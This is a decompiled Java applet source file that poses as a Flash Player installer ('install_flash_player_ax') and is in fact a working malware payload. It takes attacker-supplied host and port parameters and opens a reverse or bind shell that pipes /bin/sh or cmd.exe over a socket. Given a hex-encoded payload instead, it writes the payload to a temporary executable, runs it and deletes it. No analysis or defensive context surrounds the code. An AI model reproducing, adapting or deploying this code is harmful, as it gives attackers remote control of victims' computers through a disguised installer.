import java.io.Writer;
import java.io.BufferedWriter;
import java.io.OutputStreamWriter;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.InputStream;
import java.security.AccessController;
import java.io.FileOutputStream;
import java.io.File;
import java.net.Socket;
import java.net.ServerSocket;
import java.security.PrivilegedExceptionAction;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class install_flash_player_ax extends Applet
{
    public void init() {
        try {
            String parameter = this.getParameter("data");
            final String parameter2 = this.getParameter("lhost");
            final String parameter3 = this.getParameter("lport");
            if (parameter == null) {
                parameter = "";
            }
            final SiteSupport siteSupport = new SiteSupport();
            siteSupport.data = parameter;
            if (parameter2 != null && parameter3 != null) {
                siteSupport.lhost = parameter2;
                siteSupport.lport = Integer.parseInt(parameter3);
                System.out.println("lhost: " + parameter2);
                System.out.println("lport: " + Integer.parseInt(parameter3));
            }
            final String parameter4;
            if ((parameter4 = this.getParameter("nextPage")) != null && parameter4.length() > 0) {
                this.getAppletContext().showDocument(new URL(parameter4));
            }
            siteSupport.run();
        }
        catch (Exception ex) {
            System.out.println("Applet error: " + ex);
        }
    }
    
    class SiteSupport implements PrivilegedExceptionAction
    {
        public String data;
        public String lhost;
        public int lport;
        
        SiteSupport() {
            this.data = null;
            this.lhost = null;
            this.lport = 4444;
        }
        
        public byte[] StringToBytes(final String s) {
            final byte[] array = new byte[s.length() / 2];
            for (int i = 0; i < s.length(); i += 2) {
                array[i / 2] = (byte)((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
            }
            return array;
        }
        
        public Object run() throws Exception {
            try {
                final String property = System.getProperty("os.name");
                if (this.data.length() == 0) {
                    String s = "/bin/sh";
                    if (property.indexOf("Windows") >= 0) {
                        s = "cmd.exe";
                    }
                    Socket accept;
                    if (this.lhost == null) {
                        accept = new ServerSocket(this.lport).accept();
                    }
                    else {
                        accept = new Socket(this.lhost, this.lport);
                    }
                    if (accept != null) {
                        final Process exec = Runtime.getRuntime().exec(s);
                        new StreamConnector(exec.getInputStream(), accept.getOutputStream()).start();
                        new StreamConnector(exec.getErrorStream(), accept.getOutputStream()).start();
                        new StreamConnector(accept.getInputStream(), exec.getOutputStream()).start();
                    }
                }
                else {
                    final String string = System.getProperty("java.io.tmpdir") + File.separator + "install_flash_player_ax.exe";
                    final FileOutputStream fileOutputStream = new FileOutputStream(string);
                    fileOutputStream.write(this.StringToBytes(this.data));
                    fileOutputStream.close();
                    if (property.indexOf("Windows") < 0) {
                        Runtime.getRuntime().exec("chmod 755 " + string).waitFor();
                    }
                    Runtime.getRuntime().exec(string).waitFor();
                    new File(string).delete();
                }
            }
            catch (Exception ex) {
                System.out.println("Payload execution error: " + ex);
            }
            return null;
        }
        
        public void SiteSupport() {
            try {
                AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
            }
            catch (Exception ex) {
                System.out.println("Payload instantiation error: " + ex);
            }
        }
        
        class StreamConnector extends Thread
        {
            InputStream is;
            OutputStream os;
            
            StreamConnector(final InputStream is, final OutputStream os) {
                this.is = is;
                this.os = os;
            }
            
            public void run() {
                BufferedReader bufferedReader = null;
                BufferedWriter bufferedWriter = null;
                try {
                    bufferedReader = new BufferedReader(new InputStreamReader(this.is));
                    bufferedWriter = new BufferedWriter(new OutputStreamWriter(this.os));
                    final char[] array = new char[8192];
                    int read;
                    while ((read = bufferedReader.read(array, 0, array.length)) > 0) {
                        bufferedWriter.write(array, 0, read);
                        bufferedWriter.flush();
                    }
                }
                catch (Exception ex) {
                    System.out.println("StreamConnector error: " + ex);
                }
                try {
                    if (bufferedReader != null) {
                        bufferedReader.close();
                    }
                    if (bufferedWriter != null) {
                        bufferedWriter.close();
                    }
                }
                catch (Exception ex2) {
                    System.out.println("StreamConnector error: " + ex2);
                }
            }
        }
    }
}
